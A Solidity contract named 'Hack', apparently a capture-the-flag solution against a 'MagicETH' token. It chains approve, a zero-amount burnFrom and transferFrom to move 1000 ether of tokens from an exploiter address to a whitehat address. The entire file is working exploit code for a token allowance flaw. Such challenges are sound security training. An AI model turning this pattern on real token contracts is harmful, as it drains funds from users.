// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {MagicETH} from "./MagicETH.sol";

contract Hack is MagicETH{
    MagicETH public mEth;
    address public exploiter;
    address public whitehat;
    uint256 public hackAmount=1000 ether;
    constructor(address _mETH,address _exploiter,address _whitehat){
      mEth=MagicETH(_mETH);
      exploiter=_exploiter;
      whitehat=_whitehat;
    }


    function hack()external{  
        mEth.approve(exploiter,hackAmount);
        mEth.burnFrom(exploiter,0);
        mEth.transferFrom(exploiter,whitehat,hackAmount);
    }
}